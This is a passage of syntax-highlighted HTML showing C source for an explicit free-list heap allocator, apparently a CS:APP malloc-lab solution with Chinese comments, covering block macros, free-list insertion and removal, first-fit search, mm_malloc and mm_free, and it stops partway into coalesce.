<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>   </span><span class="token comment">//读地址p处的一个指针</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PUTADDR</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span>addr<span class="token punctuation">)</span>   <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  </span><span class="token comment">//向地址p处写一个指针</span></span><span class="token comment">/* Read the size and allocated fields from address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_SIZE</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span>                   </span><span class="token comment">//由于双字对齐条件约束，故释放最低三位，即得到的unsigned int 值为多少倍的DSIZE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_ALLOC</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span>                    </span><span class="token comment">//有无分配</span></span> <span class="token comment">/* Given block ptr bp, compute address of its header and footer */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HDRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span>                      </span><span class="token comment">//the address of the header</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FTRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span> </span><span class="token comment">//the address of the footer</span></span> <span class="token comment">/* Given block ptr bp, compute address of next and previous blocks */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//next blocks pointer</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//prev blocks pointer</span></span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRED_POINT</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>   <span class="token punctuation">(</span>bp<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">SUCC_POINT</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>   <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token operator">+</span>WSIZE<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MINBLOCK</span> <span class="token expression"><span class="token punctuation">(</span>DSIZE<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span></span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>heap_listp<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>head_free<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span>bp<span class="token punctuation">,</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insert_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">remove_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*  * mm_init - initialize the malloc package. */</span><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">PUTADDR</span><span class="token punctuation">(</span>heap_listp<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span><span class="token number">3</span><span class="token operator">*</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head_free<span class="token operator">=</span>heap_listp<span class="token punctuation">;</span>    <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//point to NULL</span>    heap_listp<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">;</span><span class="token comment">//将heap_listp指针移到序言和结尾块之间</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insert_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">GETADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> head_free<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span> bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">void</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>        tmp<span class="token operator">=</span><span class="token function">GETADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span>head_free<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        tmp<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">remove_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>pre_block<span class="token punctuation">,</span> <span class="token operator">*</span>post_block<span class="token punctuation">;</span>    pre_block <span class="token operator">=</span> <span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    post_block <span class="token operator">=</span> <span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//处理前序结点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pre_block <span class="token operator">==</span> head_free<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span> post_block<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">,</span> post_block<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//处理后序结点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>post_block <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">,</span> pre_block<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place_freelist</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//</span>    <span class="token keyword">void</span> <span class="token operator">*</span>pre_block<span class="token punctuation">,</span> <span class="token operator">*</span>post_block<span class="token punctuation">,</span> <span class="token operator">*</span>next_bp<span class="token punctuation">;</span>    <span class="token comment">//存储前后结点地址</span>    pre_block <span class="token operator">=</span> <span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    post_block <span class="token operator">=</span> <span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    next_bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//处理新的bp，进行前后连接</span>    <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>next_bp<span class="token punctuation">)</span><span class="token punctuation">,</span> pre_block<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>next_bp<span class="token punctuation">)</span><span class="token punctuation">,</span> post_block<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//处理前序结点  针对head_free是前序结点的特殊处理</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pre_block <span class="token operator">==</span> head_free<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">,</span> next_bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>pre_block<span class="token punctuation">)</span><span class="token punctuation">,</span> next_bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//处理后序结点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>post_block <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUTADDR</span><span class="token punctuation">(</span><span class="token function">PRED_POINT</span><span class="token punctuation">(</span>post_block<span class="token punctuation">)</span><span class="token punctuation">,</span> next_bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//扩展堆函数,开一个新的空闲块</span>    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//填充</span>   <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token operator">=</span><span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//注意这个（void*)</span>   <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个新的结尾块</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//开完后看能不能和前面的合并</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//在空闲块中看能否找到一个>=size的块，first fit</span><span class="token keyword">void</span> <span class="token operator">*</span>ffbp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>ffbp<span class="token operator">=</span><span class="token function">GETADDR</span><span class="token punctuation">(</span>head_free<span class="token punctuation">)</span><span class="token punctuation">;</span>ffbp<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>ffbp<span class="token operator">=</span><span class="token function">GETADDR</span><span class="token punctuation">(</span><span class="token function">SUCC_POINT</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span>size<span class="token punctuation">)</span>        <span class="token keyword">return</span> ffbp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span>  <span class="token keyword">void</span>  <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> totalsize <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> resize <span class="token operator">=</span>totalsize<span class="token operator">-</span>size<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>resize<span class="token operator">>=</span>MINBLOCK<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token operator">*</span>next_bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>next_bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>resize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后部分置为空</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>next_bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>resize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">place_freelist</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>totalsize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>totalsize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">remove_freelist</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*  * mm_malloc - Allocate a block by incrementing the brk pointer. *     Always allocate a block whose size is a multiple of the alignment. */</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">&lt;=</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        size<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>size<span class="token operator">+</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bp<span class="token operator">=</span><span class="token function">find_fit</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">)</span>bp<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//扩展堆</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span> <span class="token punctuation">(</span>extendsize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * mm_free - Freeing a block does nothing. */</span><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token 